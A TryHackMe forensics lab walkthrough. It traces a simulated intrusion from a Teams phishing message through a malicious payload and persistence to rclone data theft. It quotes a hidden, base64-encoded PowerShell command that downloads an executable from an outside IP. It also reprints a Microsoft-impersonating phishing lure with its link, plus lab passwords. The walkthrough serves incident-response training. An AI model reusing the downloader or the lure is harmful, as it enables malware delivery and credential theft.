<h1 align="center">Windows Endpoint Investigation<br>Advanced Endpoint Investigation<img width="660px" src="https://github.com/user-attachments/assets/5f257bab-be7b-455e-8d8a-95556bf3e38d"><br>Blizzard</h1>
<p align="center">July 7, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, 
and I’m excited to join you on this adventure, part of my <code>427</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>A critical alert was triggered from a sensitive server.<br> You are tasked to perform a live investigation on multiple machines to determine the root cause of the incident.</em>.<br>
Access it <a href="https://tryhackme.com/room/blizzard"</a>here.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/928fed2c-c9c2-4549-a8f6-78dfaa62d722"></p>

<h2>Task 1 . Introduction: Analysing the Impact</h2>
<p>Health Sphere Solutions, a healthcare systems provider on the path to expansion, is taking its first steps towards fortifying its infrastructure security. With the rise of cyber threats, particularly the emergence of Midnight Blizzard, a sophisticated threat group targeting the healthcare sector, the company recognizes the urgent need to protect sensitive customer data.</p>

<p>Midnight Blizzard, a notorious threat group, has been implicated in cyber-attacks against healthcare providers. Employing ransomware and phishing tactics, this group has successfully breached healthcare systems, causing significant data loss and operational interruptions.</p>

<h3>Prerequisites</h3>
<p>It is suggested to clear the following rooms first before proceeding with this room:<br>

- Windows Forensics 1<br>
- Expediting Registry Analysis<br>
- Windows Network Analysis<br>
- Windows User Activity Analysis<br>
- Windows User Account Forensics<br>
- Windows Applications Forensics</p>

<h3>Scenario</h3>
<p>A critical alert was detected on one of Health Sphere Solutions' database servers, highlighting the company's early challenges in securing its network. </p>

![image](https://github.com/user-attachments/assets/7ce0c360-5d17-4cf4-b3eb-a4c2a65e50c2)

<p>Since the security controls are still being established, alerts have only come from servers, and only network-level events are being audited, it's essential to manually investigate both servers and workstations to connect the dots and fully understand the incident.</p>

<h3>Connection Details</h3>

<p>Before we proceed with the investigation, start the attached virtual machine by clicking the Start Machine button at the top-right of this task. The machine will start in Split-Screen view. If the VM is not visible, use the blue Show Split View button at the top of the page. You can also use these credentials to access the machine via RDP.</p>

<br>

<p>In addition, your team has prepared the following items to assist your investigation:<br>

- Standalone tools in the C:\Tools directory.
- Tools prepared as desktop shortcuts.</p>

<h3>Investigation Guide</h3>
<p>As part of your playbook, you are tasked to determine the following information during the investigation:<br>

- Determine any unusual login attempts to the database server.<br>
- Note any suspicious binaries executed within the server.<br>
- Look for typical persistence mechanisms deployed in the server.</p>

<p>The IT team has also shared that the infected database server is set up for internal access only and is not yet linked to other systems, as it is still in the setup phase. This information could help narrow down potential sources of the threat.</p>

<p><em>Answer the questions below</em></p>

<p>1.1. <em>When did the attacker access this machine from another internal machine? (format: MM/DD/YYYY HH:MM:SS)</em><br>
<code>03/24/2024 19:38:48</code></p>

![image](https://github.com/user-attachments/assets/04537ed7-a4c7-4c7f-a2db-891f8526355e)

<h3>EvtxECmd</h3>

![image](https://github.com/user-attachments/assets/782b549d-1aa7-4fc7-9ef1-6479d51187a4)

<br>

<h3>Timeline Explorer</h3>

![image](https://github.com/user-attachments/assets/f38046e1-1fc2-4dd9-80a0-d91a41df8634)

![image](https://github.com/user-attachments/assets/5b7a7393-12e7-46b5-a5ee-ef3ed57491b7)

![image](https://github.com/user-attachments/assets/dadc7a69-ad5f-4959-ba65-827ee7d7e1d6)

<br>

<h3>Event Viewer</h3>

![image](https://github.com/user-attachments/assets/6e0af797-5e86-4fc1-8765-3066b60dfb53)

![image](https://github.com/user-attachments/assets/b17dc81a-72e0-4abf-8fd0-28236ef09d10)

![image](https://github.com/user-attachments/assets/a501f349-eb5a-4702-843d-994e863ef092)

![image](https://github.com/user-attachments/assets/467d0300-1847-4459-88cb-cce1d67b6c25)

<br>


<p>1.2. <em>What is the full file path of the binary used by the attacker to exfiltrate data?</em><br>
<code>C:\Users\dbadmin\.rclone\rclone-v1.66.0-windows-amd64\rclone.exe</code></p>

<h3>Windows Explorer</h3>

![image](https://github.com/user-attachments/assets/90d06c81-c741-4e7a-9b6d-c438e792cd03)

![image](https://github.com/user-attachments/assets/f219a75c-b422-460d-92a7-992feeaa6fe6)

![image](https://github.com/user-attachments/assets/a8346961-0bb5-49c4-8a60-4f9b5a41f1a8)

![image](https://github.com/user-attachments/assets/8e26f65e-49e4-4910-ab36-2af9bd0134c7)

<br>

<p>Practiced using another method.</p>

<h3>AppCompatCacheParser</h3>

![image](https://github.com/user-attachments/assets/37fc1256-cdae-4277-a120-789b77650ea9)

![image](https://github.com/user-attachments/assets/9a9e8abc-9474-4c74-bb66-1abe31f5e874)

![image](https://github.com/user-attachments/assets/02a2307c-4aa9-4bd8-8cc5-1e23bc0e8bd2)

<br>

<p>1.3. <em>What email is used by the attacker to exfiltrate sensitive data?</em><br>
<code>annajones291@hotmail.com</code></p>

<h3>Windows Explorer</h3>
<p><em>rclone.conf</em></p>

<p>with Windows PowerShell</p>

![image](https://github.com/user-attachments/assets/99b5c6bb-4afd-47e8-aa56-c706835d1aa0)

![image](https://github.com/user-attachments/assets/f0b8702c-1404-444e-8a0e-2f69162a2d70)

<p>with Windows Explorer</p>

![image](https://github.com/user-attachments/assets/5c133a91-d530-4836-ba40-9aacbaedecb0)

![image](https://github.com/user-attachments/assets/5c133a91-d530-4836-ba40-9aacbaedecb0)

<br>

<p>1.4. <em>Where did the attacker store a persistent implant in the registry? Provide the registry value name.</em><br>
<code>SecureUpdate</code></p>


<h3>Registry Editor</h3>

![image](https://github.com/user-attachments/assets/979ae801-5ccd-48bb-912f-27649f11fc0c)

![image](https://github.com/user-attachments/assets/8bc80e6a-d855-4989-80dd-840bb4f7e8db)

<br>

<p>1.5. <em>Aside from the registry implant, another persistent implant is stored within the machine. When did the attacker implant the alternative backdoor? (format: MM/DD/YYYY HH:MM:SS).</em><br>
<code>03/24/2024 20:04:05</code></p>

```bash
PS C:\Users\Administrator> Get-ScheduledTask | Where-Object {$_.Date —ne $null —and $_.State —ne "Disabled"} | Sort-Object Date | select Date,TaskName,Author,State,TaskPath | ft
```

![image](https://github.com/user-attachments/assets/f2480007-1618-4ddf-9520-c10832b9eecb)


<p><em>CDPUserSvc_9286x</em></p>

![image](https://github.com/user-attachments/assets/1d1c35b5-1e8b-451a-8461-7c2db658ab8a)

![image](https://github.com/user-attachments/assets/ba17980f-7ae6-48b1-84d0-fbdf3c8015c1)

![image](https://github.com/user-attachments/assets/296cf905-38d8-4323-8bb1-f1520f8b317f)

<p><code>2024-03-24 20:04:05</code> --> <code>03/24/2024 20:04:05</code></p>

<br>

<h2>Task 2 . Lateral Movement: Backtracking the Pivot Point</h2>
<h3>Scenario</h3>
<p>Following the detection of unusual login attempts on the database server, the investigation has pivoted towards examining a specific workstation used by an IT employee, which has been identified as the potential origin of the suspicious login to the database server.</p>

<h3>Connection Details</h3>

<p>To continue the investigation in the next machine, start the attached VM by clicking the Start Machine button at the top-right of this task. The machine will start in Split-Screen view. If the VM is not visible, use the blue Show Split View button at the top of the page. You can also use these credentials to access the machine via RDP.</p>


<p>In addition, your team has prepared the following items to assist your investigation:<br>

- Standalone tools in the C:\Tools directory.<br>
- Tools prepared as desktop shortcuts.</p>

<h3>Investigation Guide</h3>
<p></p>Your task is to meticulously analyse the workstation's artefacts by following your incident response playbook.<br>

- Determine any unusual emails or chats to cover the social engineering attack vectors.<br>
- Inspect the user's browser activity and determine if any malicious files have been downloaded or links have been accessed.<br>
- Note any suspicious binaries executed within the workstation.<br>
- Look for typical persistence mechanisms deployed in the workstation.<br>
- Review the network connections made by the workstation and see if there are potential C2 connections invoked.</p>

<p><em>Answer the questions below</em></p>

<p>2.1. <em>When did the attacker send the malicious email? (format: MM/DD/YYYY HH:MM:SS)</em><br>
<code>03/24/2024 19:06:27</code></p>

![image](https://github.com/user-attachments/assets/ea7596dd-19b5-494c-94ae-f2f718a7fd29)

![image](https://github.com/user-attachments/assets/99406f27-a65a-41ca-a56d-b149dc8f3723)

![image](https://github.com/user-attachments/assets/3d642686-3c92-4de1-a712-0b5b5716bcd5)

<br>

```bash
PS C:\Users> ls C:\Users\ | foreach {ls "C:\Users\$_\AppData\Local\Microsoft\Outlook\" 2>$null | findstr Directory}
```

![image](https://github.com/user-attachments/assets/178b3ccd-ca45-49e6-9f16-719893d93e98)

<br>

```bash
PS C:\Users> ls C:\Users\ ls C:\Users\m.anderson\AppData\Local\Microsoft\Outlook\*.ost
```

![image](https://github.com/user-attachments/assets/58a437ed-37f1-431a-86f3-ae1daa3bb5fc)

<br>

![image](https://github.com/user-attachments/assets/b1898d3c-d0a2-4911-b025-a61876b35ebb)

![image](https://github.com/user-attachments/assets/bcafeb8f-17e2-4acd-a9c1-e745ff807284)

![image](https://github.com/user-attachments/assets/d39c1438-fe34-4ffd-b6b4-fd896cc5c641)

![image](https://github.com/user-attachments/assets/0927f60d-6cbe-4720-8651-4e494b1c6f3b)

![image](https://github.com/user-attachments/assets/ecb3d9d5-8489-4476-b68b-462693218821)

![image](https://github.com/user-attachments/assets/cf5eb99f-4de6-4408-9b2b-ce3b03c52b67)

![image](https://github.com/user-attachments/assets/25a785b1-03b0-4de3-9fc8-813a25e97143)


<br>

<h3>XstReader</h3>

![image](https://github.com/user-attachments/assets/5a1fd333-9b64-453e-9890-d650c3dbb0a5)

<br>

<p>2.2. <em>When did the victim open the malicious payload? (format: MM/DD/YYYY HH:MM:SS)</em><br>
<code>03/24/2024 19:07:49</code></p>

![image](https://github.com/user-attachments/assets/b6d87c08-4144-4018-858b-4d98a3825795)

MAnderson03252024!

![image](https://github.com/user-attachments/assets/fc250db5-4f02-4068-a36a-0a635581879d)

![image](https://github.com/user-attachments/assets/850a48e3-81a8-415b-842e-214a35caf57a)


```bash
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -windowstyle hidden -enc aQB3AHIAIAAtAHUAcwBlAGIAIABoAHQAdABwADoALwAvADEAMgA4AC4AMQA5ADkALgAyADQANwAuADEANwAzAC8AYwBvAG4AZgBpAGcAdQByAGUALgBlAHgAZQAgAC0AbwB1AHQAZgBpAGwAZQAgACQAZQBuAHYAOgBhAHAAcAB
```

<h3>AppCompatCache</h3>

![image](https://github.com/user-attachments/assets/36af42bf-2868-4ab9-9ff2-f51b44369d5b)

<h3>Timeline Explorer</h3>

![image](https://github.com/user-attachments/assets/8e54c231-8aae-4350-ab2e-f6b4bea8dcf8)

![image](https://github.com/user-attachments/assets/175885ed-1b84-458c-bf48-163106982405)

![image](https://github.com/user-attachments/assets/63415727-bce5-4c4a-958a-dfef2d2af79b)

<br>

<p>2.3. <em>When was the malicious persistent implant created? (format: MM/DD/YYYY HH:MM:SS)</em><br>
<code>03/24/2024 19:16:23</code></p>

![image](https://github.com/user-attachments/assets/49c6d859-4e20-4dce-b75f-428e29d21223)

![image](https://github.com/user-attachments/assets/11979f7c-3f21-462b-ba5b-7868c8abb538)

<p>:-(</p>

![image](https://github.com/user-attachments/assets/0cf4070e-7de8-44c9-9822-15e284fabe13)

<br>

<p>2.4. <em>What is the domain accessed by the malicious implant? (format: defanged)</em><br>
<code>advancedsolutions[.]net</code></p>

![image](https://github.com/user-attachments/assets/1ff661ff-15ff-4788-aeea-5d7754f578a6)

<br>

<p>2.5. <em>What file did the attacker leverage to gain access to the database server? Provide the password found in the file.</em><br>
<code>db@dm1ns3cur3Pass!</code></p>

![image](https://github.com/user-attachments/assets/9792e98c-f5f4-413e-83a6-5f9b01e69b6c)

![image](https://github.com/user-attachments/assets/bc0c1c0c-ac83-4e55-bfcf-f6d5139854fa)

<br>


<h2>Task 3 . Initial Access: Discovering the Root Cause</h2>
<h3>Scenario</h3>
<p>The investigation pivoted to a workstation belonging to a user suspected of sending an internal phishing attack after discovering that this malicious activity compromised an IT employee's workstation. The primary aim is to uncover how the sender's Office 365 (O365) account was compromised, initiating the phishing attack.</p>

<h3>Connection Details</h3>
<p>To continue the investigation in the next machine, start the attached VM by clicking the Start Machine button at the top-right of this task. The machine will start in Split-Screen view. If the VM is not visible, use the blue Show Split View button at the top of the page. You can also use these credentials to access the machine via RDP.</p>

<p>In addition, your team has prepared the following items to assist your investigation:<br>

- Standalone tools in the C:\Tools directory.<br>
- Tools prepared as desktop shortcuts.</p>

<h3>Investigation Guide</h3>
<p>Your task is to meticulously analyse the workstation's artefacts by following your incident response playbook.<br>

- Determine any unusual emails or chats to cover the social engineering attack vectors.<br>
- Inspect the user's browser activity and determine if any malicious files have been downloaded or links have been accessed.</p>

<p>This focused approach aims to trace back the steps leading to the phishing attack, thereby understanding how the attacker accessed the victim's O365 account and used it for internal phishing attempts.</p>

<p><em>Answer the questions below</em></p>

<p>3.1. <em>When did the victim receive the malicious phishing message? (format: MM/DD/YYYY HH:MM:SS)</em><br>
<code>03/24/2024 18:36:34</code></p>

![image](https://github.com/user-attachments/assets/728e5880-d833-4d70-aa5f-2eb57bb1e44f)

![image](https://github.com/user-attachments/assets/97d0ccd7-b885-4612-b937-21d453d6cae8)

![image](https://github.com/user-attachments/assets/27f64f00-f85b-4f45-bc17-0db808bedb77)

```bash
 C:\Tools\ms_teams_parser.exe -f C:\Users\a.ramirez\AppData\Roaming\Microsoft\Teams\IndexedDB\https_teams.microsoft.com_0.indexeddb.leveldb -o ./teams.txt
```

![image](https://github.com/user-attachments/assets/8d48060f-b292-4f11-bb61-aa920d86b779)

![image](https://github.com/user-attachments/assets/8e9e27dd-8171-4650-8f3a-5ad457697f96)

```bash
"e.johnson@healthspheresolutions.onmicrosoft.com"
    },
    {
        "attachments": [],
        "cachedDeduplicationKey": "8:live:.cid.268f655553d661d1_3063920760334493725",
        "clientArrivalTime": "1711305394946.0",
        "clientmessageid": "3063920760334493725",
        "composetime": "1711305394946.0",
        "content": "Dear Alexis,\n\n\n\nWe value the security of your Microsoft account and want to ensure that it remains protected at all times.\n\n\nRecently, there has been activity related to your account that requires your attention. While there is no immediate cause for concern, we recommend reviewing your account settings and security information to ensure everything is up-to-date and secure.\n\n\nAs part of our security measures, we kindly ask you to confirm your identity by accessing the following link. \n\n\n\nhttps://login.sourcesecured.com/support/id/XkSkj321\n\n\nThis will help us verify that you are the account's rightful owner.\n\n\nIf you did not initiate any recent account activity or have any concerns about the security of your account, please contact our support team immediately.\n\n\nThank you for being so cooperative in helping us maintain the security of your account.\n\n\nSincerely,\r\nMicrosoft Identity Provider",
        "contenttype": "text",
        "conversationId": "19:uni01_kwqsezf3kqqfcqfwllsbwohsk34sqwo4bzuxkwxzrmr5geomteea@thread.v2",
        "createdTime": "2024-03-24T18:36:34.946000",
        "creator": "8:live:.cid.268f655553d661d1",
        "isFromMe": false,
        "messageKind": null,
        "messagetype": "RichText/Html",
        "origin_file": "C:\\Users\\a.ramirez\\AppData\\Roaming\\Microsoft\\Teams\\IndexedDB\\https_teams.microsoft.com_0.indexeddb.leveldb",
        "originalArrivalTime": "1711305394038.0",
        "properties": {
            "importance": "",
            "languageStamp": "languages=en:100;fil:61;id:59;length:928;&detector=Bling",
            "subject": ""
        },
        "record_type": "message",
        "version": "2024-03-24T18:36:34.038000"
    },
```

<br>

<p>3.2. <em>What is the display name of the attacker?</em><br>
<code>Microsoft Identity Provider</code></p>

<p>Discovered the answer in 3.1.</p>

<br>

<p>3.3. <em>What is the URL of the malicious phishing link? (format: defanged)</em><br>
<code>hxxps[://]login[.]sourcesecured[.]com/support/id/XkSkj321</code></p>

<p>Discovered the answer in 3.1.</p>

```bash
https://login.sourcesecured.com/support/id/XkSkj321
```

```bash
hxxps[://]login[.]sourcesecured[.]com/support/id/XkSkj321
```

<br>

<p>3.4. <em>What is the title of the phishing website?</em><br>
<code>Sign in to your account</code></p>

![image](https://github.com/user-attachments/assets/8d0f69bf-1e7f-4f8d-916c-8882404e6d38)

![image](https://github.com/user-attachments/assets/34cf49e4-62ff-43b1-a6d6-78467c5eb690)

![image](https://github.com/user-attachments/assets/401247da-a6d1-4ae9-96fd-db8e0aa4a123)


<br>

![image](https://github.com/user-attachments/assets/39b42347-a64c-497f-b088-4fb1bd25b7da)

![image](https://github.com/user-attachments/assets/0da10043-9971-4db4-a547-4187daffadfa)

![image](https://github.com/user-attachments/assets/26c9c821-c11c-4bc9-94da-ca59f1c85e38)


<br>

<p>3.5. <em>When did the victim first access the phishing website? (format: MM/DD/YYYY HH:MM:SS in UTC)</em><br>
<code>03/24/2024 18:38:29</code></p>

<br>

![image](https://github.com/user-attachments/assets/c22d9ef3-968b-4844-86b2-8858dd246333)

<br>
<br>

<h1 align="center">Room Completed</h1>
<p align="center"> <img width="1000px" src="https://github.com/user-attachments/assets/6d503703-74ae-43f0-b9ba-52a4d44a3a92"><br>
<p align="center"> <img width="1000px" src="https://github.com/user-attachments/assets/660600ff-107e-476f-9afd-337a2f5b9b79"><br>

<h1 align="center">Badge Earned</h1>
<p align="center"> <img width="1000px" src="https://github.com/user-attachments/assets/f93df32e-6ac2-47bc-9ab2-00503d34e31f"></p>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 7, 2025      | 427      |     163ʳᵈ    |      5ᵗʰ     |     824ᵗʰ   |    19ᵗʰ    |  113,315 |    833    |     64   |

</div>

<p align="center"> Global All Time: 163ʳᵈ <br><img width="300px" src="https://github.com/user-attachments/assets/8d7cc290-f26e-48fe-8f89-b72b0076ac31" alt="Your Image Badge"><br>
                                              <img width="1000px" src="https://github.com/user-attachments/assets/d63c5c81-42f2-4e1b-b389-b5b2978c68a4"><br><br>
                   Brazil All Time:   5ᵗʰ<br><img width="1000px" src="https://github.com/user-attachments/assets/75b02799-1905-47ee-b2ae-b748b5f9d0f2"><br><br>
                   Global monthly: 824ᵗʰ<br><img width="1000px" src="https://github.com/user-attachments/assets/ef33a7d7-7f63-4175-9f04-7779d57a7ad9"><br><br>
                   Brazil monthly:   19ᵗʰ<br><img width="1000px" src="https://github.com/user-attachments/assets/a18ba29e-4b07-4cf3-a375-c4c13a274f5a"><br><br></p>



